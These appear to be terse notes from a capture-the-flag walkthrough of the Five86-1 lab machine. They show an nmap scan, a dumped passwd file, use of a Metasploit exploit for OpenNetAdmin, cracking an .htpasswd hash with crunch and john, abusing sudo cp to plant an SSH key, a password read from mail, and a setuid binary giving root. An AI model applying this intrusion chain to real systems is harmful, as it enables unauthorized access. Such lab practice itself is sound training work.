root@ap:~/Scrivania/CTF/Five86_1# nmap -A -p- 192.168.43.129
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-31 22:21 CET
Nmap scan report for 192.168.43.129
Host is up (0.00032s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 69:e6:3c:bf:72:f7:a0:00:f9:d9:f4:1d:68:e2:3c:bd (RSA)
|   256 45:9e:c7:1e:9f:5b:d3:ce:fc:17:56:f2:f6:42:ab:dc (ECDSA)
|_  256 ae:0a:9e:92:64:5f:86:20:c4:11:44:e0:58:32:e5:05 (ED25519)
80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/ona
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
10000/tcp open  http    MiniServ 1.920 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
MAC Address: 08:00:27:A9:B2:05 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.32 ms 192.168.43.129

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.75 seconds


root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false
moss:x:1001:1001:Maurice Moss:/home/moss:/bin/bash
roy:x:1002:1002:Roy Trenneman:/home/roy:/bin/bash
jen:x:1003:1003:Jen Barber:/home/jen:/bin/bash
richmond:x:1004:1004:Richmond Avenal:/home/richmond:/bin/bash
douglas:x:1005:1005:Douglas Reynholm:/home/douglas:/bin/bash
Debian-exim:x:107:114::/var/spool/exim4:/usr/sbin/nologin


Use 47772.rb exploit with msfconsole to inject cmd:

www-data@five86-1:~$ cat .htpasswd
cat .htpasswd
douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1

# To make things slightly less painful (a standard dictionary will likely fail),
# use the following character set for this 10 character password: aefhrt 



crunch 10 10 aefhrt -o passlist.txt

john --wordlist=passlist.txt hash 

fatherrrrr       (douglas)



douglas@five86-1:~$ sudo -l
Matching Defaults entries for douglas on five86-1:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User douglas may run the following commands on five86-1:
    (jen) NOPASSWD: /bin/cp




douglas@five86-1:~$ ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key (/home/douglas/.ssh/id_rsa): 
/home/douglas/.ssh/id_rsa already exists.
Overwrite (y/n)? y
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/douglas/.ssh/id_rsa.
Your public key has been saved in /home/douglas/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:qD4GLRRIf2UzJModYcCLc4VPjeNU7lY5OLPVO77Dz7s douglas@five86-1
The key's randomart image is:
+---[RSA 2048]----+
|.o..o=*B         |
|. +o+**.+ o      |
|  .=Bo.= = .     |
| o.o.o..* . .    |
| .o.  .+S  o     |
|  o ...   . .    |
|   o.     ..     |
|   .o      oo    |
|   ...     .oEo  |
+----[SHA256]-----+
douglas@five86-1:~$ 
douglas@five86-1:~$ ll
-bash: ll: command not found
douglas@five86-1:~$ ls -la
total 16
drwx------ 3 douglas douglas 4096 Feb  1 05:43 .
drwxr-xr-x 7 root    root    4096 Jan  1 04:37 ..
lrwxrwxrwx 1 douglas douglas    9 Jan  1 23:05 .bash_history -> /dev/null
-rw-r--r-- 1 douglas douglas 1790 Feb  1 05:41 passwd
drwx------ 2 douglas douglas 4096 Jan  1 23:00 .ssh
douglas@five86-1:~$ rm passwd 
douglas@five86-1:~$ cp /home/douglas/.ssh/id_rsa.pub /tmp/authorized_keys
douglas@five86-1:~$ cd /tmp/
douglas@five86-1:/tmp$ ls
authorized_keys
systemd-private-14f01d9ce4244228abf13dda68256fc8-apache2.service-syvIgg
systemd-private-14f01d9ce4244228abf13dda68256fc8-systemd-timesyncd.service-oudjnM
douglas@five86-1:/tmp$ chmod 777 authorized_keys 
douglas@five86-1:/tmp$ sudo -u jen /bin/cp authorized_keys /home/jen/.ssh
douglas@five86-1:/tmp$ sudo -u jen /bin/cp authorized_keys /home/jen/.ssh/
douglas@five86-1:/tmp$ ssh jen@192.168.43.129
The authenticity of host '192.168.43.129 (192.168.43.129)' can't be established.
ECDSA key fingerprint is SHA256:aE9ZqWXrvGgzgM21BjQ23GmxQVBeD5CZw0nUq8P8RyM.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.43.129' (ECDSA) to the list of known hosts.
Linux five86-1 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
jen@five86-1:~$ 


jen@five86-1:~$ cd /var/mail/
jen@five86-1:/var/mail$ ls
jen
jen@five86-1:/var/mail$ cat jen 
From roy@five86-1 Wed Jan 01 03:17:00 2020
Return-path: <roy@five86-1>
Envelope-to: jen@five86-1
Delivery-date: Wed, 01 Jan 2020 03:17:00 -0500
Received: from roy by five86-1 with local (Exim 4.92)
	(envelope-from <roy@five86-1>)
	id 1imZBc-0001FU-El
	for jen@five86-1; Wed, 01 Jan 2020 03:17:00 -0500
To: jen@five86-1
Subject: Monday Moss
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1imZBc-0001FU-El@five86-1>
From: Roy Trenneman <roy@five86-1>
Date: Wed, 01 Jan 2020 03:17:00 -0500

Hi Jen,

As you know, I'll be on the "customer service" course on Monday due to that incident on Level 4 with the accounts people.

But anyway, I had to change Moss's password earlier today, so when Moss is back on Monday morning, can you let him know that his password is now Fire!Fire!

Moss will understand (ha ha ha ha).

Tanks,
Roy


#####################
moss:Fire!Fire!
#####################


moss@five86-1:~/.games$ 
moss@five86-1:~/.games$ ./upyourgame 
Would you like to play a game? yes

Could you please repeat that? yes

Nope, you'll need to enter that again. 
yes

You entered: No.  Is this correct? no

We appear to have a problem?  Do we have a problem? no

Made in Britain.
# 
# ls
battlestar  bombardier	freesweep  ninvaders  pacman4console  snake   upyourgame
bcd	    empire	hunt	   nsnake     petris	      sudoku  worms
# id
uid=0(root) gid=1001(moss) groups=1001(moss)

######################################################
# cat flag.txt	
8f3b38dd95eccf600593da4522251746
######################################################



